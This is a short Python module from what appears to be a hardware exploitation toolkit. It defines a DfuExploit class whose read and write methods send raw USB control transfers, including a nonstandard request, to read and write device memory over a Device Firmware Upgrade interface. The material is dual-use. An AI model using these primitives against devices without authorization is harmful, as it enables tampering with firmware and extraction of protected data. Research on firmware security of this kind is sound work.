from . import DeviceExploit

DFU_REQUEST_SEND = 0x21
DFU_REQUEST_RECEIVE = 0xa1
DFU_GETSTATUS = 0x03
DFU_UPLOAD = 0x02
DFU_DNLOAD = 0x01


class DfuExploit(DeviceExploit):

    _class = 0xFE
    _subclass = 0x01
    _protocol = 0x02

    def read(self, length):
        self.device.ctrl_transfer(DFU_REQUEST_RECEIVE, DFU_GETSTATUS, 0, 0, 6)
        self.device.ctrl_transfer(DFU_REQUEST_SEND, 0x6, 0, 0, [])
        return self.device.ctrl_transfer(
            DFU_REQUEST_RECEIVE,
            DFU_UPLOAD,
            2,
            0,
            length)

    def write(self, data):
        self.device.ctrl_transfer(DFU_REQUEST_RECEIVE, DFU_GETSTATUS, 0, 0, 6)
        self.device.ctrl_transfer(DFU_REQUEST_SEND, 0x6, 0, 0, [])
        self.device.ctrl_transfer(DFU_REQUEST_SEND, DFU_DNLOAD, 2, 0, data)
